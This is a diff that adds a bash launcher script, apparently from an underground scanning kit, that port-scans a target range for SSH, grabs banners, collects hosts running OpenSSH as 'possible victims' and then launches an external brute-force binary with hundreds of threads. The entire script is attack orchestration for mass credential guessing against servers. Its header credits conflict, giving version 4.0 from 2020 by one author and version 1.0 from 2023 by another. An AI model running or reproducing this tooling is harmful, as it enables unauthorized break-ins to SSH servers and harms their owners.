@@ -1,0 +1,74 @@
+#!/bin/bash
+
+# PRGSSH v4.0 - 08/Jan/2020
+# AUTHOR: PRG @ #oldTeam UnderNet
+
+#   __________________________
+#  |                         |
+#  | ###### ###### ##    ##  |
+#  | ##     ##     ##    ##  |
+#  | ###### ###### ########  |
+#  |     ##     ## ##    ##  |
+#  | ###### ###### ##    ##  |
+#  |                         |
+#  |   VERSION 1.0 - 2023    |
+#  |    CREATED BY StrX      |
+#  |_________________________|
+
+
+#CONFIG
+key=PRG-oldTeam      # key for scanner ( DO NOT MODIFY )
+mode=normal          # normal or verbose mode (if you put <verbose>) it will show you print like: Check IP with user USER and pass PASS
+port=22              # port for bruteforce
+uidThreads=500       # threads if you are uid0
+usrThreads=350       # threads if you are user
+banThreads=150       # threads for banner grabber
+psSpeed=8            # portscan speed
+#END CONFIG
+
+ rm -rf ips.lst bios.txt banner.log
+
+
+if [[ $UID == 0 || $EUID == 0 ]]; then
+
+ echo -e "[+] uid0 detected "
+
+ ./ps $port -a $1 -s $psSpeed
+
+ echo -e "[+] Banner grabber starting... "
+ sleep 3
+./b bios.txt $port $banThreads
+
+ cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst
+
+ ipscount=`grep -c . ips.lst`
+
+ echo -e "[+] Found $ipscount possible victims "
+
+ sleep 5
+
+ ./prg $uidThreads $port $mode $key
+
+ else
+
+ echo -e "[+] user detected "
+
+ ./ps2 $1 $port
+
+ echo -e "[+] Banner grabber starting... "
+
+ sleep 1
+
+ ./b bios.txt $port $banThreads
+
+ sleep 3
+
+ cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst
+
+ sleep 5
+
+ echo -e "[+] Start bruteforce attack... "
+
+ ./prg $usrThreads $port $mode $key
+
+fi
